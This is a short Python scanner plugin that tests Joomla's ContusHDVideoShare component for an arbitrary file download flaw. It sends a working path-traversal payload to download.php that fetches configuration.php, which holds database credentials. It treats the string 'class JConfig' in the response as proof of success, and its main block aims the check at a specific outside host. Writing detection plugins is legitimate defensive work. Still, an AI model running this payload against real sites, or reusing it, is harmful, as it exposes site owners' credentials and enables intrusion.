#!/usr/bin/env python
"""
Joomla ContusHDVideoShare com_contushdvideoshare - Arbitrary File Download Vulnerability
http://cn.1337day.com/exploit/23186
"""
def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = 'components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and 'class JConfig' in res:#the joomla configuration.php contain the words "class JConfig"
         security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://fcat.dyndns.org/')[1])